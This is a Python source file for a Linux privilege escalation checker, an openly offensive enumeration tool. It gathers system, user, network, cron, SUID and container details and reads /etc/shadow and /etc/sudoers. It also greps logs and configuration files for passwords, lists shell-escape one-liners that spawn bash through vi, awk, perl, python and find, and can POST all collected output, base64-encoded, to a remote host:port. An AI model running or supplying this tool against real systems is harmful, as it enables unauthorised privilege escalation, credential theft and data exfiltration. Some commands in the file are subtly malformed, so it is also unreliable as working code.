#!/usr/bin/env python3
import argparse
import sys
import subprocess as sub
from shutil import which
from urllib.request import Request, urlopen
from urllib.parse import urlencode
from urllib.error import URLError
from base64 import b64encode


class HTTPUpload(object):
    """Send our collected data back."""
    def __init__(self, host, port):
        self.url = 'http://{}:{}'.format(host, port)
        self.error = False

    def write(self, msg):
        post = {'data': b64encode(msg)}
        try:
            r = Request(self.url, urlencode(post).encode())
            urlopen(r)
        except URLError:
            # Display the error message only once
            # and don't exit the program
            if self.error is False:
                sys.stderr.write("Couldn't connect back to linuxprivserver.py")
                self.error = True


bigline = b'=' * 80
smlline = b'-' * 80


def printColour(text, streams, colour=None):
    """
    Writes the output to the various binary output streams.
    Optionally colorizes the output

    :param text: The text to write to the output streams. If the type is a
                 string, it will be converted to a binary string.
    :type bytes:
    :param streams: A list of output streams (preferentially binary streams)
    :type list:
    :param colour: None, or a bytestring with a bash colour code highlighting
                   text
    :type None_or_bytes:
    :rtype None:
    """
    if type(text) == str:
        text = text.encode()
    if colour is not None:
        text = b'\x1b[1;' + colour + b'm' + text + b'\x1b[0m'
    for s in streams:
        s.write(text)


def printFormatResult(cmdDict, streams, color=None):
    """
    Parse the dictionary 'cmdDict' and send the results to printColour.

    :param cmdDict: A dictionary containing a list of dictionaries. Each
                    sub-dictionary contains a 'msg' with a description and
                    a 'results' containing the output executed commands or
                    reading files.
    :type dict:
    :param streams: A list of output streams (preferentially binary streams)
    :type list:
    :rtype None:
    """
    for item in cmdDict:
        if 'results' not in cmdDict[item]:
            continue
        msg = cmdDict[item]['msg'].encode()
        results = cmdDict[item]['results']
        if type(results) == str:
            results = results.encode()
        printColour(b'\n[+] ' + msg, streams, color)
        printColour(b'\n' + results, streams)
        printColour(b'', streams, color)


def execCmd(cmdDict):
    """
    Execute the commands in cmdDict. Note that the cmdDict will be updated to
    include the results of the executed commands/read files.

    :param cmdDict: cmdDict is dictionary that contains a list of dictionaries.
                    Each sub-dictionary should contain either of the following
                    entries:
                    - 'cmd': the command to execute, it can be specified as a
                      list, or as a string. In the latter case, the 'cmd' will
                      be executed in a shell.
                    - 'altcmd': when 'cmd' does not exist in $PATH, it will try
                      to execute 'altcmd' instead. For syntax, see 'cmd'.
                    - 'file': can be specified instead of 'cmd' to read files
    :type dict:
    :rtype dict:
    """
    for item in cmdDict:
        if 'cmd' in cmdDict[item]:
            cmd = cmdDict[item]['cmd']
            # Check if the binary exists in $PATH
            if which(cmd[0]) is None:
                if 'altcmd' in cmdDict[item] and \
                        which(cmdDict[item]['altcmd']) is not None:
                    cmdDict[item]['cmd'] = cmdDict[item]['altcmd']
                else:
                    continue
            try:
                # Spawn shell only if cmd is supplied as a str instead of list
                # Load on target is reduced when spawning a shell is avoided
                shell = type(cmd) == str
                proc = sub.Popen(cmd,
                                 stdout=sub.PIPE,
                                 stderr=sub.DEVNULL,
                                 shell=shell)
            except PermissionError:
                continue
            out = proc.stdout.read()
        elif 'file' in cmdDict[item]:
            filename = cmdDict[item]['file']
            try:
                with open(filename, 'rb') as f:
                    out = f.read()
            except (FileNotFoundError, PermissionError):
                continue
        cmdDict[item]['results'] = out
    return cmdDict


def getSystemInfo():
    info = {}
    info['OS'] = {'file': '/etc/issue',
                  'msg': 'Operating System'}
    info['KERNEL'] = {'file': '/proc/version',
                      'msg': 'Kernel'}
    info['HOSTNAME'] = {'file': '/etc/hostname',
                        'msg': 'Hostname'}

    return execCmd(info)


def getNetworkInfo():
    info = {}
    info['NETINFO'] = {'cmd': ['ip', 'addr' 'show'],
                       'altcmd': ['ifconfig'],
                       'msg': 'Interfaces'}
    info['ROUTE'] = {'cmd': ['ip', 'route'],
                     'altcmd': ['route'],
                     'msg': 'Routing table'}
    info['NETSTAT'] = {'cmd': ['ss', '-tupan'],
                       'altcmd': ['netstat', '-tupan'],
                       'msg': 'TCP and UDP open ports and connections'}
    info['ARP'] = {'cmd': ['ip', 'neigh'],
                   'altcmd': ['arp', '-a'],
                   'msg': 'Arp cache'}

    return execCmd(info)


def getFileSystemInfo():
    info = {}
    info['MOUNT'] = {'file': '/etc/mtab',
                     'msg': 'Currently mounted filesystems'}
    info['FSTAB'] = {'cmd': '/etc/fstab',
                     'msg': 'fstab entries (mounted at boot)'}

    return execCmd(info)


def getCronJobs():
    info = {}
    info['CRON'] = {'cmd': 'ls -la /etc/cron*',
                    'msg': 'Scheduled cron jobs'}
    info['CRONW'] = {'cmd': 'ls -Rl /etc/cron* 2>/dev/null | awk "$1 ~ /w.$/"',
                     'msg': 'Writable cron dirs'}

    return execCmd(info)


def getSystemdInfo():
    info = {}
    info['systemd-timers'] = {'cmd': ['systemctl', 'list-timers'],
                              'msg': 'systemd scheduled tasks'}
    info['journalctl'] = {'cmd': ['journalctl', '-n', '100'],
                          'msg': 'Last 100 lines in journalctl (adm group)'}

    return execCmd(info)


def getUserInfo(deep=False):
    info = {}
    info['WHOAMI'] = {'cmd': ['whoami'],
                      'msg': 'Current User'}
    info['ID'] = {'cmd': ['id'],
                  'msg': 'Current User ID'}
    info['ALLUSERS'] = {'cmd': ['getent', 'passwd'],
                        'msg': 'All users'}
    info['ALLGROUPS'] = {'cmd': ['getent', 'group'],
                         'msg': 'All groups'}
    info['HISTORY'] = {'cmd': 'ls -la ~/.*hist*; ls -la /root/.*hist*',
                       'msg': 'Root and current user history (depends on privs)'}
    info['ENV'] = {'file': '/proc/self/environ',
                   'msg': 'Environment variables'}
    info['SUDOERS'] = {'file': '/etc/sudoers',
                       'msg': 'Sudoers (privileged)'}
    info['SUDOCMD'] = {'cmd': ['sudo', '-nl'],
                       'msg': 'Allowed sudo commands'}
    info['LOGGEDIN'] = {'cmd': ['w'],
                        'msg': 'Logged in User Activity'}

    return execCmd(info)


def interestingGroups(groups):
    info = {}
    if b'sudo' in groups:
        info['sudo'] = {'msg': 'User belongs to the group: sudo',
                        'results': 'Can be used for privilege escalation.'}
    if b'adm' in groups:
        info['adm'] = {'msg': 'User belongs to group: adm',
                       'results': 'Can view numerous log files/journalctl and perform some administrative tasks'}
    if b'docker' in groups:
        info['docker'] = {'msg': 'User belongs to group: docker',
                          'results': b'Might be used for privilege escalation. Consider e.g. https://fosterelli.co/privilege-escalation-via-docker.html'}
    if b'lxd' in groups:
        info['lxd'] = {'msg': 'User belongs to group: lxd',
                       'results': b'Consider e.g. https://reboare.github.io/lxd/lxd-escape.html'}
    if b'disk' in groups:
        info['disk'] = {'msg': 'User belongs to group: disk',
                        'results': b'Full permission to alter the filesystem, for example through debugfs'}

    return info


def getFileDirInfo(home, runFind=True):
    info = {}
    info['USERHOME'] = {'cmd': ['ls', '-ahl', '/home'],
                        'msg': 'Checking permissions on the home folders.'}
    info['ROOTHOME'] = {'cmd': ['ls', '-ahl', '/root'],
                        'msg': 'Checking if root\'s folder is accessible'}
    if not runFind:
        return execCmd(info)
    info['WWDIRSROOT'] = \
        {'cmd': ['find', '/', '-writable', '-type', '-d', '(', '-user', 'root',
                 '-o', '-group', 'root', ')', '-ls'],
         'msg': 'World-writable directories for User/Group root'}
    info['WWDIRS'] = \
        {'cmd': ['find', '/', '-path', home, '-prune', '-o', '-path', '/proc',
                 '-prune', '-o', '-writable', '-type', 'd', '-ls'],
         'msg': 'World-writeable directories for current user outside $HOME'}
    info['WWFILES'] = \
        {'cmd': ['find', '/', '-path', home, '-prune', '-o', '-path', '/proc',
                 '-prune', '-o', '-writable', '-type', 'f', '-ls'],
         'msg': 'World-writable files for current user outside $HOME'}
    info['SUID'] = \
        {'cmd': ['find', '/', '(', '-perm', '-2000', '-o', '-perm', '-4000',
                 ')', '-ls'],
         'msg': 'SUID/SGID Files and Directories'}
    info['CAPS'] = {'cmd': ['getcap', '-r', '/'],
                    'msg': 'Files with Linux capabilities'}

    return execCmd(info)


def getPwFileInfo():
    info = {}
    info['LOGPWDS'] = \
        {'cmd': ['egrep',  'pwd|password', '/var/log', '-r'],
         'msg': 'Log files in /var/log containing password or pwd'}
    info['CONFPWDS'] = \
        {'cmd': ['egrep',  'pwd|password', '/etc', '--include', '*conf*',
                 '-r'],
         'msg': 'Configuration files in /etc containing password or pwd'}
    info['SHADOW'] = {'file': '/etc/shadow',
                      'msg': 'Shadow File (Privileged)'}

    return execCmd(info)


def getMail():
    info = {'MAIL': {'cmd': ['ls', '-la', '/var/mail/'],
                     'msg': 'Any mail that can be read.'}}

    return execCmd(info)


def processesAppsInfo(sysInfo):
    # Debian/Ubuntu systems
    if which('dpkg') is not None:
        getPkgs = "dpkg -l | awk '{$1=$4=\"\"; print $0}'"
    # Arch/Manjaro systems
    elif which('pacman') is not None:
        getPkgs = ['pacman', '-Qe']
    # OpenSuse/Fedora/Red Hat systems
    elif which('rpm') is not None:
        getPkgs = 'rpm -qa | sort -u'
    elif which('equery') is not None:
        getPkgs = ['equery', 'list', '"*"']
    # Alpine systems
    elif which('apk') is not None:
        getPkgs = 'apk info -vv | sort'

    info = {}
    info['PROCS'] = {'cmd': ['ps', 'aux'],
                     'msg': "Current processes"}
    info['PKGS'] = {'cmd': getPkgs,
                    'msg': "Installed Packages"}
    info['CONF'] = {'cmd': ['find', '/etc', '-name', '*.conf', '-ls'],
                    'msg': 'Configuration files inside /etc'}

    return execCmd(info)


def moreApps():
    info = {}
    info['SUDO'] = {'cmd': 'sudo -V | grep version',
                    'msg': 'Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)'}
    info['APACHE'] = {'cmd': 'apache2 -v; apache2ctl -M; httpd -v; apachectl -l',
                      'msg': 'Apache Version and Modules'}
    info['APACHECONF'] = {'file': '/etc/apache2/apache2.conf',
                          'msg': 'Apache Config File'}
    info['NGINX'] = {'cmd': ['nginx', '-v'],
                     'msg': 'Nginx version'}
    info['NGINXCONF'] = {'file': '/etc/nginx/nginx.conf',
                         'msg': 'Nginx version'}

    return execCmd(info)


def getContainerInfo():
    info = {}
    info['DockerVersion'] = {'cmd': ['docker', '--version'],
                             'msg': 'Is docker available'}
    info['DockerInside'] = {'cmd': 'grep docker /proc/self/cgroup && ls -l /.dockerenv',
                            'msg': 'Are we inside a docker container?'}
    info['LXCInside'] = {'cmd': ['grep', '-qa', 'container=lxc', '/proc/1/environ'],
                         'msg': 'Are we inside a lxc container (privileged)?'}

    return execCmd(info)


# EXPLOIT ENUMERATION
def exploitEnum():
    devTools = {}
    tools = ['which', 'awk', 'perl', 'python', 'python2', 'python3', 'ruby',
             'gcc', 'g++', 'go', 'rustc', 'cc', 'nmap', 'find', 'netcat', 'nc',
             'wget', 'tftp', 'ftp']
    toolsResult = b''
    for t in tools:
        w = which(t)
        if w is not None:
            toolsResult += w.encode() + b'\n'
    devTools['TOOLS'] = {'results': toolsResult,
                         'msg': 'Installed Tools'}
    editors = ['vi', 'vim', 'nvim', 'nano', 'pico', 'emacs']
    editorsResult = b''
    for e in editors:
        w = which(e)
        if e is not None:
            editorsResult += e.encode() + b'\n'
    devTools['EDITORS'] = {'results': editorsResult,
                           'msg': 'Installed editors'}

    return devTools


def main(args):
    if not args.color:
        RED = None
        GREEN = None
        YELLOW = None
    else:
        RED = b'31'
        GREEN = b'32'
        YELLOW = b'33'

    if args.outputfile:
        try:
            outfile = open(args.outputfile, 'wb')
        except (IOError, PermissionError):
            msg = 'Something went wrong opening the output file. Giving up!'
            if args.color and not args.quiet:
                printColour(msg, sys.stdout, RED)
            elif not args.quiet:
                sys.stdout.write(msg)
            sys.exit(1)
    else:
        args.outputfile = False

    if args.sendhttp:
        ip, port = args.sendhttp.split(':')
        upload = HTTPUpload(ip, port)

    outputs = []
    if not args.quiet:
        outputs.append(sys.stdout.buffer)
    if args.outputfile:
        outputs.append(outfile)
    if args.sendhttp:
        outputs.append(upload)

    printColour(bigline, outputs, GREEN)
    printColour('\n\tThe Linux privilege escalation checker\n', outputs, GREEN)
    printColour(bigline, outputs, GREEN)

    sysInfo = getSystemInfo()
    printColour('\n\n[*] GETTING BASIC SYSTEM INFO...', outputs, RED)
    printFormatResult(sysInfo, outputs, YELLOW)

    userInfo = getUserInfo()
    userInfo['ENV']['results'] = userInfo['ENV']['results'].replace(b'\x00', b'\n')
    # Add the user's home folder
    for line in userInfo['ALLUSERS']['results'].splitlines():
        if line.startswith(userInfo['WHOAMI']['results'].strip()):
            userInfo['HOMEFOLDER'] = {'results': line.split(b':')[5],
                                      'msg': "Location of user's home folder"}
    groupInfo = interestingGroups(userInfo["ID"]["results"])
    printColour('\n\n[*] GETTING USER AND ENVIRONMENTAL INFO...', outputs, RED)
    printFormatResult(userInfo, outputs, YELLOW)
    printFormatResult(groupInfo, outputs, YELLOW)

    netInfo = getNetworkInfo()
    printColour('\n\n[*] GETTING NETWORKING INFO...', outputs, RED)
    printFormatResult(netInfo, outputs, YELLOW)

    fsInfo = getFileSystemInfo()
    printColour('\n\n[*] GETTING FILESYSTEM INFO...', outputs, RED)
    printFormatResult(fsInfo, outputs, YELLOW)

    cronInfo = getCronJobs()
    printColour('\n\n[*] GETTING INFO ON CRON JOBS...', outputs, RED)
    printFormatResult(cronInfo, outputs, YELLOW)

    systemdInfo = getSystemdInfo()
    printColour('\n\n[*] GETTING systemd/journalctl INFO...', outputs, RED)
    printFormatResult(systemdInfo, outputs, YELLOW)

    fileDirInfo = getFileDirInfo(userInfo['HOMEFOLDER']['results'], args.deep)
    printColour('\n\n[*] GETTING FILESYSTEM INFO...', outputs, RED)
    printFormatResult(fileDirInfo, outputs, YELLOW)

    pwFileInfo = getPwFileInfo()
    printColour('\n\n[*] GETTING PASSWORD INFO...', outputs, RED)
    printFormatResult(pwFileInfo, outputs, YELLOW)

    mailInfo = getMail()
    printColour('\n\n[*] GETTING MAIL INFO...', outputs, RED)
    printFormatResult(mailInfo, outputs, YELLOW)

    psInfo = processesAppsInfo(sysInfo)
    printColour('\n\n[*] GETTING INFO ON PROCESSES AND APPS...', outputs, RED)
    printFormatResult(psInfo, outputs, YELLOW)

    apps = moreApps()
    printColour('\n\n[*] GETTING MORE INFO ON APPS...', outputs, RED)
    printFormatResult(apps, outputs, YELLOW)

    containerInfo = getContainerInfo()
    printColour('\n\n[*] GETTING LXC/DOCKER INFO...\n', outputs, RED)
    printFormatResult(containerInfo, outputs, YELLOW)

    exploitTools = exploitEnum()
    printColour('\n\n[*] ENUMERATING LANGUAGES/TOOLS...\n', outputs, RED)
    printFormatResult(exploitTools, outputs, YELLOW)

    printColour('\n\n[+] Related Shell Escape Sequences...\n', outputs, YELLOW)
    escapeCmd = \
        {b'vi': [b':!bash', b':set shell=/bin/bash:shell'],
         b'awk': [b"awk 'BEGIN {system(\"/bin/bash\")}'"],
         b'perl': [b"perl -e 'exec \"/bin/bash\";'"],
         b'python2': [b"python2 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
         b'python3': [b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
         b'find': [b"find / -exec awk 'BEGIN {system(\"/bin/bash\")}' \\;"]}
    for cmd in escapeCmd:
        for result in exploitTools['TOOLS']['results'].splitlines():
            if cmd in result:
                for item in escapeCmd[cmd]:
                    printColour(cmd + b' -->\t' + item + b'\n', outputs)

    if args.outputfile:
        outfile.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-c',
                        '--color',
                        dest='color',
                        default=False,
                        required=False,
                        action='store_true',
                        help='Colorize the output (default is False)')
    parser.add_argument('-o',
                        '--outputfile',
                        dest='outputfile',
                        metavar='filename',
                        required=False,
                        help='Save the output to the specified filename')
    parser.add_argument('-s',
                        '--sendhttp',
                        dest='sendhttp',
                        metavar='127.0.0.1:8080',
                        default=False,
                        required=False,
                        help='Sends the output to host:port')
    parser.add_argument('-q',
                        '--quiet',
                        dest='quiet',
                        default=False,
                        required=False,
                        action='store_true',
                        help="Don't output results to the screen")
    parser.add_argument('-d',
                        '--deep-scan',
                        dest='deep',
                        default=True,
                        metavar='(True|False)',
                        type=bool,
                        required=False,
                        help=('Scan the filesystem for interesting files. This'
                              ' is on by default, but it can make scans take a'
                              ' while to execute and it produces a large load'
                              ' on the filesystem.'))
    args = parser.parse_args()

    main(args)
